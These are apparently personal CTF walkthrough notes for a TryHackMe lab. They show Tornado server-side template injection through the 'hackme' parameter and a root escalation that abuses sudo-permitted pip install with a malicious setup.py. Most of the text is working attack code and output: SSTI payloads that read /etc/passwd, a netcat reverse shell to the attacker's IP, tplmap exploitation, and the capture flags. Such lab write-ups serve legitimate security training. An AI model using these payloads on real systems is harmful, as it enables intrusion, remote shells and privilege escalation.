  Created wheel for PyYAML: filename=PyYAML-5.1.2-cp27-cp27mu-linux_x86_64.whl size=44911 sha256=37bbeddd242824f328c5b9a19fe71d86bde8aad52e8c3c5d33409585c537c07d
  Stored in directory: /home/kali/.cache/pip/wheels/87/9b/a7/9bfdaa1487acce958269a6b5f86db2e4d38204dff4e256e23a
Successfully built PyYAML
Installing collected packages: PyYAML, certifi, chardet, idna, urllib3, requests
Successfully installed PyYAML-5.1.2 certifi-2018.10.15 chardet-3.0.4 idna-2.8 requests-2.22.0 urllib3-1.24.1

┌──(env)─(kali㉿kali)-[~/noname_ctf/tplmap]
└─$ ./tplmap.py -u http://10.10.163.81:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme= --reverse-shell 10.8.19.103 1337
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'hackme' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin has detected unreliable rendering with tag '{{*}}', skipping
[+] Tornado plugin is testing blind injection
[+] Tornado plugin has confirmed blind injection
[+] Tplmap identified the following injection point:

  GET parameter: hackme
  Engine: Tornado
  Injection: *
  Context: text
  OS: undetected
  Technique: blind
  Capabilities:

   Shell command execution: ok (blind)
   Bind and reverse shell: ok
   File write: ok (blind)
   File read: no
   Code evaluation: ok, python code (blind)

[-][tcpserver] Port bind on 0.0.0.0:1337 has failed: [Errno 98] Address already in use



┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.163.81.
Ncat: Connection from 10.10.163.81:37710.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
zeldris
$ ls
server.py
$ cat server.py
import tornado.template
import tornado.ioloop
import tornado.web
TEMPLATE = '''
<html>
 <head><title> Hello {{ name }} </title></head>
 <body><section class="inside"><h2>Cyber Security training made easy</h2></br>Hello FOO <p class='m0'>TryHackMe takes the pain out of learning and teaching Cybersecurity. Our platform makes it a comfortable experience to learn by designing prebuilt courses which include virtual machines (VM) hosted in the cloud ready to be deployed. This avoids the hassle of downloading and configuring VM's. Our platform is perfect for CTFs, Workshops, Assessments or Training.</p></section></section></div><div class="container main pb"><section class="row"><div class="col-md-4 green-hover"><h2><i class="fas fa-spider"></i> Hack Instantly</h2><p>Learn, practice and complete! Get hands on and practise your skills in a real-world environment by completing fun and difficult tasks. You can deploy VMs, which will give an IP address instantly and away you go.</p></div><div class="col-md-4 green-hover"><h2><i class="fas fa-door-closed"></i> Rooms</h2><p>Rooms are virtual areas dedicated to particular cyber security topics. For example, a room called "Hacking the Web" could be dedicated to web application vulnerabilities. </p></div><div class="col-md-4 green-hover"><h2><i class="fab fa-fort-awesome"></i> Tasks</h2><p>Each room has tasks that contain questions and hints, a custom leaderboard and chat area. Whilst you're hacking away, you can discuss hacking techniques or request help from others.</p><!-- ?hackme= --></div></section> 
</body>
</html>
'''
class MainHandler(tornado.web.RequestHandler):

    def get(self):
        name = self.get_argument('hackme', '')
        template_data = TEMPLATE.replace("FOO",name)
        t = tornado.template.Template(template_data)
        self.write(t.generate(name=name))

application = tornado.web.Application([
    (r"/40b5dffec4e39b7a3e9d261d2fc4a038/", MainHandler),
], debug=True, static_path=None, template_path=None)

if __name__ == '__main__':
    application.listen(9090)
    tornado.ioloop.IOLoop.instance().start()
$ pwd
/home/zeldris/nonamectf/ssti
$ cd ..
$ ls
run.sh
ssti
tryhackme
$ cat run.sh
#!/bin/bash
socat TCP-LISTEN:2222,reuseaddr,fork EXEC:./tryhackme,pty,stderr,echo=0
$ cd ..
$ ls
nonamectf
user.txt
$ cat user.txt
THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}

priv esc

https://gtfobins.github.io/gtfobins/pip/

$ sudo -l
Matching Defaults entries for zeldris on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeldris may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/pip install *


$ python3 -c 'import pty;pty.spawn("/bin/bash")'
zeldris@ubuntu:/tmp$ TF=$(mktemp -d)
TF=$(mktemp -d)
zeldris@ubuntu:/tmp$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
<sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py             
zeldris@ubuntu:/tmp$ sudo pip install $TF
sudo pip install $TF
The directory '/home/zeldris/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/zeldris/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing ./tmp.AiMqJEpCCo
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt  ufw
# cat root.txt
cat root.txt
THN{F4KE_PIP_PACKAGE_INSTALL}

# cd ufw
cd ufw
# ls
ls
ufw.sh
# cat ufw.sh
cat ufw.sh
ufw disable

or doing manually

http://10.10.55.71:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={{%20%27%27.__class__.__mro__[1].__subclasses__()%20}}

It is attempting to access the subclasses of the superclass of the empty string ('') by chaining together multiple attributes and methods. Specifically, it is calling the **class** attribute of an empty string, which returns the class object, then the **mro** attribute of that class object, which returns the method resolution order, and then the **subclasses** method of the first item of that method resolution order.
This payload is attempting to exploit a vulnerability in the application by accessing classes

Hello [<class 'property'>, <class 'str'>, <class 'inspect._empty'>, _ForwardRef('HTTPFile'), <class '_frozen_importlib.BuiltinImporter'>, typing.Generic<+T_co>, <class 'asyncio.subprocess.Process'>, <class 'hmac.HMAC'>, <class 'logging.PlaceHolder'>, <class '_ssl._SSLSocket'>, <class 'dict_valueiterator'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'itertools.zip_longest'>, <class 'itertools.takewhile'>, <class 'threading.Semaphore'>, <class '_weakrefset.WeakSet'>, <class 'bytearray_iterator'>, <class 'classmethod'>, <class 'range_iterator'>, <class 'callable_iterator'>, <class 'concurrent.futures._base.Future'>, <class 'importlib.abc.Loader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'tornado.gen.Runner'>, <class 'string.Template'>, <class 'collections.abc.Sized'>, <class 'csv.Dialect'>, <class 'logging.Formatter'>, <class '_frozen_importlib._ModuleLock'>, <class 'itertools._tee'>, <class 'cell'>, <class 'ipaddress._BaseV6'>, <class 'codecs.IncrementalEncoder'>, <class 'asyncio.futures._TracebackLogger'>, <class 'ssl.SSLObject'>, <class '_frozen_importlib_external.PathFinder'>, <class 'email._policybase._PolicyBase'>, <class 'collections.abc.AsyncIterable'>, <class 'frozenset'>, <class 'PyCapsule'>, <class 'managedbuffer'>, <class 'sre_parse.Pattern'>, <class 'pickle._Framer'>, <class 'iterator'>, <class '_bz2.BZ2Compressor'>, <class 'staticmethod'>, _ForwardRef('Matcher'), <enum 'Enum'>, <class 'coroutine_wrapper'>, <class '_frozen_importlib._installed_safely'>, <class 'datetime.time'>, <class 'select.epoll'>, <class '_pickle.UnpicklerMemoProxy'>, <class 'tornado.httputil.HTTPConnection'>, _ForwardRef('OutputTransform'), <class 'logging.PercentStyle'>, <class 'builtin_function_or_method'>, <class 'float'>, <class 'EncodingMap'>, <class '_sitebuiltins.Quitter'>, <class 'dict_keys'>, <class 'threading.Event'>, <class 'tornado.locale.Locale'>, <class 'itertools.permutations'>, <class 'tarfile._LowLevelFile'>, <class 'itertools.combinations_with_replacement'>, <class 'list_reverseiterator'>, <class 'tornado.template._TemplateReader'>, <class 'pkgutil.ImpImporter'>, <class '_collections._deque_iterator'>, <class 'ipaddress._IPAddressBase'>, <class 'json.encoder.JSONEncoder'>, <class 'int'>, <class 'itertools.chain'>, _ForwardRef('RequestStartLine'), <class '_sre.SRE_Pattern'>, <class 'json.decoder.JSONDecoder'>, <class 'itertools.islice'>, <class 'zlib.Decompress'>, <class 'tornado.web.RequestHandler'>, <class '_frozen_importlib._ManageReload'>, <class 'weakref.finalize._Info'>, <class 'csv.DictWriter'>, _ForwardRef('Optional[Type[BaseException]]'), <class 'tornado.template._CodeWriter.indent.<locals>.Indenter'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class 'tornado.iostream.BaseIOStream'>, <class 'csv.Sniffer'>, <class 'ellipsis'>, <class 'tornado.ioloop._Selectable'>, _ForwardRef('BaseLoader'), <class 'numbers.Number'>, _ForwardRef('Resolver'), <class 'multiprocessing.connection.SocketListener'>, <class 'threading.Thread'>, _ForwardRef('IOLoop'), <class 'email.feedparser.BufferedSubFile'>, <class 'tornado.util.GzipDecompressor'>, <class 'tornado.template._CodeWriter'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'itertools.count'>, <class '_collections._deque_reverse_iterator'>, <class 'itertools.groupby'>, <class 'itertools.starmap'>, <class 'itertools.accumulate'>, <class '_lzma.LZMACompressor'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'asyncio.streams.StreamWriter'>, <class 'unicodedata.UCD'>, <class 'tornado.httputil.HTTPServerRequest'>, <class 'contextlib.ContextDecorator'>, <class 'calendar.Calendar'>, <class 'concurrent.futures.process._WorkItem'>, <class 'super'>, <class 'tornado.util.ArgReplacer'>, <class 'tornado.ioloop._Timeout'>, <class 'itertools._grouper'>, <class 'http.client.HTTPConnection'>, <class '_curses.curses window'>, <class 'contextlib.closing'>, <class 'typing.re'>, <class 'classmethod_descriptor'>, <class 'complex'>, <class 'traceback'>, <class 'weakcallableproxy'>, <class 'tornado.ioloop.PeriodicCallback'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class 'importlib.abc.Finder'>, <class 'tornado.web._UIModuleNamespace'>, <class 'calendar._localized_day'>, <class 'collections.abc.Iterable'>, <class 'inspect.Signature'>, <class 'tarfile._Stream'>, _ForwardRef('Matcher'), <class 'dict_items'>, <class '_thread.RLock'>, <class 'NotImplementedType'>, <class 'dict_values'>, <class 'inspect._void'>, <class 'codecs.StreamReaderWriter'>, <class 'concurrent.futures._base._Waiter'>, <class 'threading._RLock'>, typing._Protocol<+T_co>, <class 'os._wrap_close'>, <class 'tornado.tcpserver.TCPServer'>, <class 'tornado.template.BaseLoader'>, <class 'datetime.timedelta'>, <class 'itertools._tee_dataobject'>, <class '_pickle.PicklerMemoProxy'>, <class 'tornado.web.OutputTransform'>, <class 'email.charset.Charset'>, <class '_frozen_importlib.ModuleSpec'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'ast.NodeVisitor'>, typing._Protocol<+T_co>, <class '_sitebuiltins._Helper'>, <class 'dict_keyiterator'>, <class '_io._IOBase'>, <class 'queue.Queue'>, <class 'warnings.catch_warnings'>, <class 'tempfile.SpooledTemporaryFile'>, <class 'select.poll'>, <class 'bytes_iterator'>, <class 'logging.LogRecord'>, <class 'list'>, <class '_lzma.LZMADecompressor'>, <class 'email.header.Header'>, <class 'multiprocessing.process.BaseProcess'>, <class 'multiprocessing.connection.Listener'>, <class 'concurrent.futures.process._CallItem'>, <class 'multiprocessing.context.BaseContext'>, _ForwardRef('Future[_T]'), typing.Generic<+T_co>, <class 'zlib.Compress'>, <class 'tornado.gen._NullFuture'>, _ForwardRef('Return'), <class 'tuple'>, _ForwardRef('_Node'), typing.Generic<+T_co, -T_contra, +V_co>, <class 'inspect.BlockFinder'>, <class 'posix.ScandirIterator'>, <class 'multiprocessing.connection._ConnectionBase'>, <class 'tornado.httputil.HTTPMessageDelegate'>, <class 'frame'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'array.array'>, <class 'asyncio.sslproto._SSLPipe'>, <class 'typing.io'>, <class '_ssl._SSLContext'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.compress'>, <class 'subprocess.Popen'>, _ForwardRef('OutputTransform'), <class 'pickle._Pickler'>, <class 'threading.Barrier'>, <class 'asyncio.events.AbstractServer'>, _ForwardRef('UIModule'), _ForwardRef('_NamedBlock'), <class '_sre.SRE_Scanner'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile.TemporaryDirectory'>, <class 'map'>, <class 'email.parser.BytesParser'>, _ForwardRef('_Node'), <class 'ipaddress._IPv4Constants'>, <class 'operator.itemgetter'>, <class 'textwrap.TextWrapper'>, <class 'collections.abc.Hashable'>, <class '_csv.reader'>, <class '_frozen_importlib_external._NamespacePath'>, <class 'Struct'>, <class 'asyncio.events.Handle'>, <class 'method_descriptor'>, <class 'code'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'posix.DirEntry'>, <class 'zipimport.zipimporter'>, <class '_pickle.Pickler'>, <class 'typing._TypeAlias'>, <class 'multiprocessing.connection.ConnectionWrapper'>, <class 'email._parseaddr.AddrlistClass'>, _ForwardRef('Rule'), <class 'range'>, <class 'module'>, <class 'asyncio.coroutines.CoroWrapper'>, <class 'tornado.template._CodeWriter.indent.<locals>.Indenter'>, <class '_frozen_importlib._ImportLockContext'>, _ForwardRef('ResponseStartLine'), <class '_csv.Dialect'>, <class 'formatteriterator'>, <class 'weakref.finalize'>, _ForwardRef('_Node'), <class 'pickle._Unpickler'>, _ForwardRef('ResponseStartLine'), <class 'traceback.TracebackException'>, _ForwardRef('Resolver'), <class 'selectors.BaseSelector'>, <class 'tornado.httpserver._HTTPRequestContext'>, <class 'codecs.StreamRecoder'>, <class 'tornado.gen.WaitIterator'>, <class '_pickle.Pdata'>, <class 'reversed'>, <class '_json.Scanner'>, <class 'codecs.Codec'>, _ForwardRef('RequestStartLine'), <class '_frozen_importlib._DummyModuleLock'>, <class 'email.header._ValueFormatter'>, <class '_json.Encoder'>, <class 'concurrent.futures._base.Executor'>, typing._Protocol, <class 'gzip._PaddedFile'>, <class 'asyncio.queues.Queue'>, <class 'datetime.date'>, _ForwardRef('OutputTransform'), <class 'ipaddress._BaseV4'>, <class '_frozen_importlib.FrozenImporter'>, <class 'tornado.routing.Matcher'>, <class 'tornado.iostream._StreamBuffer'>, <class 'tarfile.TarIter'>, <class 'tornado.template._UnsetMarker'>, _ForwardRef('SSLIOStream'), <class 'inspect.BoundArguments'>, <class 'tornado.http1connection.HTTP1ConnectionParameters'>, <class '_ssl.MemoryBIO'>, <class '_hashlib.HASH'>, <class 'os._DummyDirEntry'>, <class 'sre_parse.SubPattern'>, typing.Generic, typing.Generic<~AnyStr>, <class 'function'>, <class 'itertools.cycle'>, <class 'string.Formatter'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'odict_iterator'>, <class 'mimetypes.MimeTypes'>, <class '_sre.SRE_Match'>, <class 'email.message.Message'>, <class 'abc.ABC'>, <class 'tornado.process.Subprocess'>, <class '_thread._local'>, <class 'collections.abc.Callable'>, <class '_frozen_importlib_external._LoaderBasics'>, <class 'functools.partialmethod'>, <class 'tornado.util.Configurable'>, <class 'type'>, <class 'warnings.WarningMessage'>, <class '_random.Random'>, <class 'operator.attrgetter'>, <class 'operator.methodcaller'>, _ForwardRef('_NamedBlock'), <class 'instancemethod'>, <class 'zip'>, <class 'weakref'>, <class 'pickle._Unframer'>, <class 'concurrent.futures.process._ResultItem'>, <class 'multiprocessing.util.Finalize'>, <class 're.Scanner'>, <class 'tornado.http1connection.HTTP1ServerConnection'>, typing.Generic<~KT, +VT_co>, <class '_weakrefset._IterationGuard'>, <class 'slice'>, <class 'longrange_iterator'>, <class 'moduledef'>, <class '_bz2.BZ2Decompressor'>, <class 'calendar._localized_month'>, <class 'tokenize.Untokenizer'>, <class 'tornado.template.Template'>, <class '_sitebuiltins._Printer'>, <class 'contextlib.ExitStack'>, _ForwardRef('_Node'), <class '_pickle.Unpickler'>, <class 'coroutine'>, <class '_thread.lock'>, <class 'tornado.web._ArgDefaultMarker'>, <class 'inspect.Parameter'>, typing.Generic<+CT>, <class 'gettext.NullTranslations'>, <class 'dict_itemiterator'>, _ForwardRef('Future[_T]'), <class 'tornado.template._Node'>, <class 'email.feedparser.FeedParser'>, <class 'multiprocessing.reduction._C'>, <class 'dict'>, <class 'tuple_iterator'>, <class 'member_descriptor'>, <class '_socket.socket'>, <class 'pkgutil.ImpLoader'>, <class 'asyncio.locks.Event'>, <class 'tornado.template._CodeWriter.indent.<locals>.Indenter'>, <class 'collections.abc.Container'>, <class 'weakproxy'>, typing.Generic<+T_co>, <class 'csv.DictReader'>, <class 'logging.LoggerAdapter'>, <class 'multiprocessing.util.ForkAwareThreadLock'>, <class '_frozen_importlib._ModuleLockManager'>, _ForwardRef('Generator[Any, Any, _T]'), <class 'mappingproxy'>, <class '_multiprocessing.SemLock'>, _ForwardRef('Matcher'), <class 'dis.Bytecode'>, <class 'logging.handlers.QueueListener'>, _ForwardRef('_File'), <class 'tarfile.TarFile'>, _ForwardRef('_Node'), <class 'tornado.http1connection._ExceptionLoggingContext'>, <class 'types._GeneratorWrapper'>, <class 'traceback.FrameSummary'>, <class 'concurrent.futures.process._ExceptionWithTraceback'>, <class 'set'>, <class 'itertools.combinations'>, <class 'collections.deque'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, typing._Protocol<+T_co>, <class 'sre_parse.Tokenizer'>, <class '_frozen_importlib_external.FileLoader'>, <class 'bytes'>, <class 'tornado.web.UIModule'>, <class 'tarfile.TarInfo'>, <class 'tornado.routing.Rule'>, <class 'contextlib._RedirectStream'>, <class 'typing.Final'>, <class 'bytearray'>, <class 'filter'>, <class 'NoneType'>, <class 'functools.partial'>, <class 'tornado.httputil.HTTPServerConnectionDelegate'>, <class 'urllib.parse._ResultMixinStr'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class 'getset_descriptor'>, <class 'method-wrapper'>, <class 'method'>, <class 'subprocess.CompletedProcess'>, <class 'str_iterator'>, <class 'logging.Manager'>, <class 'tempfile._RandomNameSequence'>, <class 'logging.Filter'>, <class '_csv.writer'>, <class '_thread._localdummy'>, <class '_io._BytesIOBuffer'>, <class 'set_iterator'>, <class 'asyncio.locks._ContextManager'>, <class 'memoryview'>, <class 'generator'>, typing.Generic<+T_co>, <class 'asyncio.transports.BaseTransport'>, <class 'asyncio.futures.Future'>, <class 'urllib.parse._ResultMixinBytes'>, <class '_ast.AST'>, <class 'reprlib.Repr'>, <class 'fieldnameiterator'>, <class 'enumerate'>, <class 'datetime.tzinfo'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'copy._EmptyClass'>, <class '_io.IncrementalNewlineDecoder'>, <class 'BaseException'>, <class 'types.SimpleNamespace'>, _ForwardRef('IOStream'), <class 'functools._lru_cache_wrapper'>, <class 'collections.abc.Awaitable'>, <class 'asyncio.streams.StreamReader'>, <class 'calendar.different_locale'>, <class 'logging.Filterer'>, <class 'contextlib.suppress'>, <class 'wrapper_descriptor'>, <class 'types.DynamicClassAttribute'>, <class 'codecs.IncrementalDecoder'>, <class 'ipaddress._IPv6Constants'>, <class 'list_iterator'>, <class 'stderrprinter'>, _ForwardRef('BaseLoader'), <class 'email.parser.Parser'>, <class 'threading.Condition'>, <class 'tarfile._FileInFile'>, <class 'tarfile._StreamProxy'>, <class 'collections._Link'>, <class 'logging.BufferingFormatter'>, typing.Generic<~KT, +VT_co>] 

http://10.10.55.71:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%%20import%20os%20%}{{%20os.popen(%22cat%20/etc/passwd%22).read()%20}}

Hello root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false zeldris:x:1000:1000:NoNameCTF2,,,:/home/zeldris:/bin/bash sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin 

http://10.10.55.71:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%%20import%20os%20%}{{%20os.popen(%22cat%20/home/zeldris/user.txt%22).read()%20}}

Hello THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE} 

http://10.10.55.71:9090/40b5dffec4e39b7a3e9d261d2fc4a038/?hackme={%%20import%20os%20%}{{%20os.popen(%22nc%2010.8.19.103%201337%20-e%20/bin/bash%22).read()%20}}

┌──(kali㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.55.71.
Ncat: Connection from 10.10.55.71:34786.
whoami
zeldris
python3 -c 'import pty;pty.spawn("/bin/bash")'
zeldris@ubuntu:~/nonamectf/ssti$ sudo -l
sudo -l
Matching Defaults entries for zeldris on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User zeldris may run the following commands on ubuntu:
    (ALL : ALL) ALL
    (root : root) NOPASSWD: /usr/bin/pip install *
zeldris@ubuntu:~/nonamectf/ssti$ TF=$(mktemp -d)
TF=$(mktemp -d)
zeldris@ubuntu:~/nonamectf/ssti$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
<execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py 
zeldris@ubuntu:~/nonamectf/ssti$ sudo pip install $TF
sudo pip install $TF
The directory '/home/zeldris/.cache/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
The directory '/home/zeldris/.cache/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.
Processing /tmp/tmp.D25ysNM6jY
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
THN{F4KE_PIP_PACKAGE_INSTALL}

:)

```


Compromise this machine and obtain user.txt

*THM{SSTI_AND_BUFFER_OVERFLOW_W4S_HERE}*

Escalate privileges and obtain root.txt

*THN{F4KE_PIP_PACKAGE_INSTALL}*


[[Binex]]